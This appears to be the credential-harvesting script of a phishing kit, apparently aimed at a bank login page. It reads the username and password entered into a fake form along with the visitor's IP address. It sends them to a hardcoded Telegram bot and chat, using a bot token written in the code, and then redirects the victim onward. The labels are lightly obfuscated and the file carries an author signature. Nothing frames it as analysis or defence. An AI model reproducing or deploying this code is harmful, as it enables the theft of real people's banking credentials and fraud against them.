//bot token
var telegram_bot_id = "7894605559:AAG78y5-Ucgpr-OSE6DgyFs4ihV54L-W_oU";
//chat id
var chat_id = -1002391136714;
var pax, pax2, ip;
var ready = function () {
    pax = document.getElementById("miDiosenticonfio").value;
    pax2 = document.getElementById("miDiosenticonfio2").value;
    ip = document.getElementById("ip").innerHTML;
    message = "🔹BHDE\n👤Usxvry0: " + pax + "\n🔒Ucl4ve: " + pax2 + "\nIP: " + ip +"\n🔹BY SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        top.location.href = 'index2.html';
        console.log(response);
    });
    return false;
};
